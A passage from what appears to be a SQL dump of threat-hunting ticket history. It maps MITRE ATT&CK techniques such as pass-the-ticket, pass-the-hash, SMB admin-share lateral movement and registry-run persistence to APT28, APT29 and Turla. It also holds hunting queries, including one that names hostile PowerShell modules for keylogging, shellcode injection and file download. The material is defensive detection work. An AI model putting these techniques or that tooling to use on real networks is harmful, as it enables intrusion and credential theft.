access to a network.\r\n\r\nOrganizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider\'s access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used.\r\n\r\n+*Hunter Notes:*+\r\n<pre>\r\nNetwork:\r\nWould REALLY be hard to ID\r\n\r\nHost:\r\nActive Directory examine trusted relationships between domains/forests\r\n</pre>\r\n\r\n+*Reference:*+\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1199/\r\nhttps://confluence.di2e.net/display/CYH836/T1199+-+Trusted+Relationship?src=contextnavpagetreemode\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1199+-+Trusted+Relationship?src=contextnavpagetreemode\r\n</pre>'),(216,215,'relation','copied_to',NULL,'110'),(218,217,'relation','copied_to',NULL,'111'),(223,222,'relation','copied_to',NULL,'113'),(224,223,'relation','copied_from',NULL,'46'),(225,224,'attr','subject','Privilege Escalation','Privilege Escalation - Parent Ticket'),(226,224,'attr','description','','The adversary is trying to gain higher-level permissions.\r\n\r\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include:\r\n\r\n    SYSTEM/root level\r\n    local administrator\r\n    user account with admin-like access\r\n    user accounts with access to specific system or perform specific function\r\n\r\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.'),(227,225,'attr','tracker_id','1','5'),(228,229,'attr','subject','Abuse Elevation Control - T1548','Abuse Elevation Control - T1548.002'),(229,234,'attr','description','Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.\r\n\r\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\r\n\r\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\r\n\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1550\r\nhttp://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016\r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1550.003+Pass+the+Ticket','Adversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account\'s password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\r\n\r\nWhen preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user\'s service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.\r\n\r\nA Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).\r\n\r\nA Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.\r\n\r\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket.\r\n\r\nh3. Reference:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1550\r\nhttp://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016\r\n</pre>\r\n\r\nh3. Playbook:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1550.003+Pass+the+Ticket\r\n</pre>'),(230,235,'attr','description','Turla has also used PowerSploit\'s Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell payload into a random process on the victim system. Turla has used Metasploit to perform reflective DLL injection in order to escalate privileges.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nEventID : (800 OR 4103 OR 4104) AND \"invoke-screencapture\" OR \"get-clipboard\" OR \"inject-shellcode\" OR \"get-keystrokes\" OR \"downloadstrings\" OR \"downloadfile\" OR \"Invoke-ReflectivePEInjection\"\r\n\r\nA query for dangerous powershell modules\r\n(Sigma)windows/builtin/win_metasploit_authentication\r\n(Sigma)proxy/proxy_ua_frameworks\r\n(Sigma)linux/lnx_shell_susp_commands\r\n<pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1055/001/\r\n<pre>\r\n','Turla has also used PowerSploit\'s Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell payload into a random process on the victim system. Turla has used Metasploit to perform reflective DLL injection in order to escalate privileges.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nEventID : (800 OR 4103 OR 4104) AND \"invoke-screencapture\" OR \"get-clipboard\" OR \"inject-shellcode\" OR \"get-keystrokes\" OR \"downloadstrings\" OR \"downloadfile\" OR \"Invoke-ReflectivePEInjection\"\r\n\r\nA query for dangerous powershell modules\r\n(Sigma)windows/builtin/win_metasploit_authentication\r\n(Sigma)proxy/proxy_ua_frameworks\r\n(Sigma)linux/lnx_shell_susp_commands\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1055/001/\r\n</pre>\r\n'),(231,237,'attr','subject','Data from Information Repositories T1213','Data from Information Repositories - T1213'),(232,239,'attr','description','Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with SMB/Windows Admin Shares or Remote Desktop Protocol. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\r\n\r\nTurla - RPC backdoors can be used to transfer files to/from victim machines on the local network.\r\nReferences:\r\nhttps://www.welivesecurity.com/2019/05/29/turla-powershell-usage/\r\nhttps://www.symantec.com/blogs/threat-intelligence/waterbug-espionage-governments\r\n','Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with SMB/Windows Admin Shares or Remote Desktop Protocol. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\r\n\r\nTurla - RPC backdoors can be used to transfer files to/from victim machines on the local network.\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1570/\r\nhttps://www.welivesecurity.com/2019/05/29/turla-powershell-usage/\r\nhttps://www.symantec.com/blogs/threat-intelligence/waterbug-espionage-governments\r\n</pre>'),(233,243,'attr','subject','Indicator Removal on Host: Timestomp - T1070.006 ','Indicator Removal on Host: Timestomp - T1070.006 (H)'),(234,248,'attr','subject','T1059 - Command and Scripting Interpreter: PowerShell - T1059.001','Command and Scripting Interpreter: PowerShell - T1059.001'),(235,249,'attr','description','APT 29 added Registry Run keys to establish persistence. APT 29 drops a Windows shortcut file for execution.\r\n\r\n*+Hunter Notes:+*\r\n<pre> \r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/\r\n</pre>','(001):APT 29 added Registry Run keys to establish persistence. APT 29 drops a Windows shortcut file for execution.\r\n(009):Drops a Windows shortcut file for execution.\r\n\r\n*+Hunter Notes:+*\r\n<pre> \r\nT1547.001:\r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n\r\nT1547.009\r\nEventID : 11 AND (.lnk) \r\nVisualization to accomplish least frequency analysis\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/\r\n</pre>'),(236,250,'attr','description','(001):APT 29 added Registry Run keys to establish persistence. APT 29 drops a Windows shortcut file for execution.\r\n(009):Drops a Windows shortcut file for execution.\r\n\r\n*+Hunter Notes:+*\r\n<pre> \r\nT1547.001:\r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n\r\nT1547.009\r\nEventID : 11 AND (.lnk) \r\nVisualization to accomplish least frequency analysis\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/\r\n</pre>','(001):APT 29 added Registry Run keys to establish persistence. APT 29 drops a Windows shortcut file for execution.\r\n(009):Drops a Windows shortcut file for execution.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nT1547.001:\r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n\r\nT1547.009\r\nEventID : 11 AND (.lnk) \r\nVisualization to accomplish least frequency analysis\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/\r\n</pre>'),(237,251,'attr','description','(001):APT 29 added Registry Run keys to establish persistence. APT 29 drops a Windows shortcut file for execution.\r\n(009):Drops a Windows shortcut file for execution.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nT1547.001:\r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n\r\nT1547.009\r\nEventID : 11 AND (.lnk) \r\nVisualization to accomplish least frequency analysis\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/\r\n</pre>','(001):APT 29 added Registry Run keys to establish persistence. APT 29 drops a Windows shortcut file for execution.\r\n(009):Drops a Windows shortcut file for execution.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nT1547.001:\r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n\r\nT1547.009:\r\nEventID : 11 AND (.lnk) \r\nVisualization to accomplish least frequency analysis\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/\r\n</pre>'),(238,252,'attr','description','(001):APT 29 added Registry Run keys to establish persistence. APT 29 drops a Windows shortcut file for execution.\r\n(009):Drops a Windows shortcut file for execution.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nT1547.001:\r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n\r\nT1547.009:\r\nEventID : 11 AND (.lnk) \r\nVisualization to accomplish least frequency analysis\r\n</pre>\r\n\r\n*+Reference+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/\r\n</pre>','(001):APT 29 added Registry Run keys to establish persistence. APT 29 drops a Windows shortcut file for execution.\r\n(009):Drops a Windows shortcut file for execution.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nT1547.001:\r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n\r\nT1547.009:\r\nEventID : 11 AND (.lnk) \r\nVisualization to accomplish least frequency analysis\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/\r\n</pre>'),(239,255,'attr','description','Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\r\n\r\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\r\n\r\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMIN$, and IPC$. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB,[1] to interact with systems using remote procedure calls (RPCs),[2] transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.[3]\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1021/002/\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1021+-+Remote+Services?src=contextnavpagetreemode\r\n</pre>\r\n','Adversaries may use Valid Accounts to interact with a remote network share using Server Message Block (SMB). The adversary may then perform actions as the logged-on user.\r\n\r\nSMB is a file, printer, and serial port sharing protocol for Windows machines on the same network or domain. Adversaries may use SMB to interact with file shares, allowing them to move laterally throughout a network. Linux and macOS implementations of SMB typically use Samba.\r\n\r\nWindows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include C$, ADMIN$, and IPC$. Adversaries may use this technique in conjunction with administrator-level Valid Accounts to remotely access a networked system over SMB,[1] to interact with systems using remote procedure calls (RPCs),[2] transfer files, and run transferred binaries through remote Execution. Example execution techniques that rely on authenticated sessions over SMB/RPC are Scheduled Task/Job, Service Execution, and Windows Management Instrumentation. Adversaries can also use NTLM hashes to access administrator shares on systems with Pass the Hash and certain configuration and patch levels.[3]\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1021/002/\r\n</pre>\r\n\r\nPlaybook:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/Turla%3A+T1021+-+Remote+Services?src=contextnavpagetreemode\r\n</pre>\r\n'),(240,257,'attr','subject','Event Triggered Execution - T1546','Event Triggered Execution - T1546.003 / .008'),(241,257,'attr','description','APT 29 used sticky-keys to obtain unauthenticated, privileged console access. APT 29 has used WMI to establish persistence.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nSigma rule: sysmon_stickykey_like_backdoor.yml\r\n(Playbook) T1546 - Event Triggered Execution\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1546/003/\r\n</pre>','(003)APT 29 used sticky-keys to obtain unauthenticated, privileged console access. \r\n(008)APT 29 has used WMI to establish persistence.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nHost:\r\nSigma rule: sysmon_stickykey_like_backdoor.yml\r\n(Playbook) T1546 - Event Triggered Execution\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1546/003/\r\n</pre>'),(242,258,'attr','subject','Acquire Infrastructure - T1583','Acquire Infrastructure: Web Services  - T1583.006'),(243,258,'attr','description','Adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.[1] Additionally, botnets are available for rent or purchase.\r\n\r\nUse of these infrastructure solutions allows an adversary to stage, launch, and execute an operation. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.','Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service) or Exfiltration Over Web Service. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.'),(244,259,'relation','copied_to',NULL,'136'),(245,260,'relation','copied_from',NULL,'135'),(246,261,'relation','copied_to',NULL,'138'),(247,262,'relation','copied_from',NULL,'136'),(248,263,'attr','subject','Boot or Logon Initiliazation Script - T1037','Boot or Logon Initiliazation Script - T1037.001'),(249,265,'relation','copied_to',NULL,'139'),(250,266,'relation','copied_from',NULL,'138'),(251,267,'relation','copied_to',NULL,'141'),(252,268,'relation','copied_from',NULL,'131'),(253,270,'attr','description','(001):APT 29 added Registry Run keys to establish persistence. APT 29 drops a Windows shortcut file for execution.\r\n(009):Drops a Windows shortcut file for execution.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nT1547.001:\r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n\r\nT1547.009:\r\nEventID : 11 AND (.lnk) \r\nVisualization to accomplish least frequency analysis\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/\r\n</pre>','(001):APT 29 added Registry Run keys to establish persistence. APT 29 drops a Windows shortcut file for execution.\r\n(009):Drops a Windows shortcut file for execution.\r\nAPT28 has deployed malware that has copied itself to the startup directory for persistence.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nT1547.001:\r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n\r\nT1547.009:\r\nEventID : 11 AND (.lnk) \r\nVisualization to accomplish least frequency analysis\r\n\r\nAPT28:\r\n(Playbook) T1547.001 - Boot or Logon Autostart Execution\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/\r\n</pre>'),(254,273,'relation','copied_to',NULL,'146'),(255,274,'relation','copied_from',NULL,'139'),(256,275,'attr','description','Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with SMB/Windows Admin Shares or Remote Desktop Protocol. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\r\n\r\nTurla - RPC backdoors can be used to transfer files to/from victim machines on the local network.\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1570/\r\nhttps://www.welivesecurity.com/2019/05/29/turla-powershell-usage/\r\nhttps://www.symantec.com/blogs/threat-intelligence/waterbug-espionage-governments\r\n</pre>','Adversaries may transfer tools or other files between systems in a compromised environment. Files may be copied from one system to another to stage adversary tools or other files over the course of an operation. Adversaries may copy files laterally between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over SMB to connected network shares or with authenticated connections with SMB/Windows Admin Shares or Remote Desktop Protocol. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.\r\n\r\nTurla - RPC backdoors can be used to transfer files to/from victim machines on the local network.\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1570/\r\nhttps://www.welivesecurity.com/2019/05/29/turla-powershell-usage/\r\nhttps://www.symantec.com/blogs/threat-intelligence/waterbug-espionage-governments\r\n</pre>\r\n'),(257,276,'relation','copied_to',NULL,'147'),(258,277,'relation','copied_from',NULL,'146'),(259,278,'attr','subject','Scheduled Task/Job - T1053','Scheduled Task/Job - T1053.005'),(260,279,'attr','description','has deployed malware that has copied itself to the startup directory for persistence. C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\n(EventID: 1 OR 11) AND *AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start*\r\n\r\nThe above is for initial creation.  Validation of all files in C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ will need to be accomplished with Endgame\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\n\r\n</pre>','APT28 has deployed malware that has copied itself to the startup directory for persistence. C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\r\n\r\nA Turla Javascript backdoor added a local_update_check value under the Registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run to establish persistence. Additionally, a Turla custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence. Turla established persistence by adding a Shell value under the Registry key HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion]Winlogon.\r\n\r\n*+Hunter Notes:+*\r\n<pre>\r\nAPT28:\r\n(EventID: 1 OR 11) AND *AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start*\r\n\r\nThe above is for initial creation.  Validation of all files in C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ will need to be accomplished with Endgame\r\n\r\nTurla:\r\nEventID : (1 OR 800 OR 4103 OR 4104 OR 4688) AND (\"dir\" OR \"tree\" OR \"find\" OR \"locate\" OR \"ls\")\r\n</pre>\r\n\r\n*+Reference:+*\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1547/001/\r\n</pre>'),(261,280,'attr','description','Adversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account\'s password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\r\n\r\nWhen preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user\'s service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.\r\n\r\nA Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).\r\n\r\nA Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.\r\n\r\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket.\r\n\r\nh3. Reference:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1550\r\nhttp://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016\r\n</pre>\r\n\r\nh3. Playbook:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1550.003+Pass+the+Ticket\r\n</pre>','Adversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account\'s password. Kerberos authentication can be used as the first step to lateral movement to a remote system.\r\n\r\nWhen preforming PtT, valid Kerberos tickets for Valid Accounts are captured by OS Credential Dumping. A user\'s service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.\r\n\r\nA Silver Ticket can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).\r\n\r\nA Golden Ticket can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.\r\n\r\nAdversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e. Pass the Hash) while also using the password hash to create a valid Kerberos ticket.\r\n\r\nh3. Reference:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1550\r\nhttp://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016\r\n</pre>\r\n\r\nh3. Playbook:\r\n<pre>\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1550.003+Pass+the+Ticket\r\nhttps://confluence.di2e.net/display/CYH836/APT+28%3A+Pass+the+Ticket\r\n</pre>'),(262,281,'relation','copied_to',NULL,'149'),(263,282,'relation','copied_from',NULL,'141'),(264,283,'attr','subject','Hide Artifacts: Hidden Files and Directories - T1564.001 ','Hide Artifacts: Hidden Files and Directories - T1564.001 (H)'),(265,285,'attr','description','Adversaries may \"pass the hash\" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user\'s cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\r\n\r\nWhen performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\r\n\r\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1550/002/\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1550.002+-+Pass+the+Hash\r\n</pre>\r\n','Adversaries may \"pass the hash\" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user\'s cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.\r\n\r\nWhen performing PtH, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.\r\n\r\nAdversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to perform Pass the Ticket attacks\r\n\r\nReferences:\r\n<pre>\r\nhttps://attack.mitre.org/techniques/T1550/002/\r\n</pre>\r\n\r\nPlaybook:\r\n<pre>\r\nhttps://confluence.di2e.net/x/zB34RQ\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+T1550.002+-+Pass+the+Hash\r\n</pre>\r\n'),(266,286,'attr','description','Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.','Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.\r\n\r\n<pre>\r\n(Playbook) https://confluence.di2e.net/display/CYH836/T1564+-+Hide+Artifacts\r\nEventID: 4103 OR 4104 AND commandline: \"*powershell.exe -WindowStyle Hidden*\"\r\n</pre>'),(267,287,'attr','subject','Hide Artifacts: Hidden Window - T1564.003','Hide Artifacts: Hidden Window - T1564.003 (H)'),(268,288,'attr','description','Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\r\n\r\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Scanning or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\r\n\r\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)\r\n\r\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1210                                           \r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+Exploitation+of+Remote+Services\r\n','Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\r\n\r\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Scanning or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\r\n\r\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)\r\n\r\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1210                                           \r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/APT28%3A+T1210+-+Exploitation+of+Remote+Service\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+Exploitation+of+Remote+Services\r\n'),(269,290,'relation','copied_to',NULL,'157'),(270,291,'relation','copied_from',NULL,'154'),(271,292,'attr','subject','Access Token Manipulation: Token Impersonation/Theft - T1134.-001','Access Token Manipulation: Token Impersonation/Theft - T1134.-001 (H)'),(272,292,'attr','description','Adversaries may duplicate then impersonate another user\'s token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using DuplicateToken(Ex). The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user\'s security context, or with SetThreadToken to assign the impersonated token to a thread.\r\n\r\nAn adversary may do this when they have a specific, existing process they want to assign the new token to. For example, this may be useful for when the target user has a non-network logon session on the system.\r\n','Adversaries may duplicate then impersonate another user\'s token to escalate privileges and bypass access controls. An adversary can create a new access token that duplicates an existing token using DuplicateToken(Ex). The token can then be used with ImpersonateLoggedOnUser to allow the calling thread to impersonate a logged on user\'s security context, or with 